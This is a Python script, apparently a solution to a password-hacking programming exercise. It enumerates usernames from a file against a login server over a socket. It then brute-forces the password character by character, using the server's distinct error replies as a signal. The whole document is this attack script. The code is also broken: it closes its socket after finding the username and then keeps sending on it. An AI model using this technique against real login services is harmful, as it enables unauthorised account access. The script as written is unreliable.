# write your code here
import socket
import sys
import json

args = sys.argv
host = args[1]
port = int(args[2])
address = (host, port)


def generate_passwords(password, src):
    for letter in src:
        new_password = password + letter
        yield new_password


flag = 0
cracked_password = ''
cracked_username = ''
letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
with socket.socket() as sock, open("logins.txt", "r") as src:
    sock.connect(address)
    for line in src:
        d = str(line).strip("\n")
        data = {
            "login": d,
            "password": ""
        }
        login_details = json.dumps(data)
        sock.send(login_details.encode())
        resp = sock.recv(1024)
        response = json.loads(resp.decode())
        res = response["result"]
        if res == "Wrong password!":
            cracked_username = d
            sock.close()
            break
    password = ''
    while True:
        x = generate_passwords(password, letters)
        for i in x:
            data = {
                "login": d,
                "password": i
            }
            login_details = json.dumps(data)
            sock.send(login_details.encode())
            resp = sock.recv(1024)
            response = json.loads(resp.decode())
            res = response["result"]
            if res == "Exception happened during login":
                password = i
                break
            if res == "Connection success!":
                cracked_password = i
                flag = 1
                sock.close()
                break
        if flag == 1:
            sock.close()
            break
    sock.close()

data = {
    "login": cracked_username,
    "password": cracked_password
}

print(json.dumps(data))
